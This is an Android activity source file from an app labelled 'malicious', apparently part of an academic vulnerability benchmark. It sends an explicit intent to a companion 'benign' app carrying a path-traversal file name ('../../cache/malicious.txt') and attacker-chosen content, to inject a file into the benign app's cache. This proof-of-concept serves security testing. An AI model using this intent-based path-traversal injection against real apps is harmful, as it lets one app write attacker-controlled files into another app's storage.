package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    private static int INTERNAL_REQUEST_CODE = 100;
    private static String TAG = "MaliciousMainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String fileName = "../../cache/malicious.txt";
                String data = "I am malicious";
                Intent i = new Intent();
                i.setPackage("edu.ksu.cs.benign");
                i.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.MainActivity");
                i.putExtra("fileName", fileName);
                i.putExtra("fileContent", data);
                startActivityForResult(i, INTERNAL_REQUEST_CODE);
            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        TextView result = (TextView) findViewById(R.id.result);
        if (requestCode == INTERNAL_REQUEST_CODE && resultCode == RESULT_OK) {
            Log.d(TAG, "malicious file injected successfully in Benign/cache");
            result.setText(R.string.success);
        } else {
            result.setText(R.string.failure);
        }
    }
}
